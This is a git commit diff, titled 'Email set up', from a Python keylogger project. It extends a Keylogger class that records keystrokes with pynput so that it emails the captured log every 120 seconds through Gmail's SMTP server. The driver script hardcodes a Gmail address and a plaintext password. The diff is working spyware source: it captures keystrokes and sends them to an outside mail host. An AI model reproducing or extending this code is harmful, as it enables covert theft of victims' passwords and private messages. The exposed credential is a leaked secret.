5f6f8ae27735157b25d3786019e1686fd05d4c3d
Susheel99 <asusheel23b@gmail.com>
2021-10-18 11:33:41 +0100

    Email set up

--- main.py
+++ main.py
@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
 import threading
 import pynput.keyboard
+import smtplib
 
 class Keylogger:
-    def __init__(self):
-        self.log = ""
-        #self.start()
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger Started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
     def append_to_log(self, string):
         self.log = self.log + string
@@ -22,10 +25,18 @@ class Keylogger:
 
 
     def report(self):
-        print(self.log)
+        #print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
-        timer = threading.Timer(5, self.report)
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
--- zlogger.py
+++ zlogger.py
@@ -2,5 +2,5 @@
 
 import main
 
-my_keylogger = main.Keylogger()
+my_keylogger = main.Keylogger(120, 'asusheel23b@gmail.com', 'susheel@12345')
 my_keylogger.start()
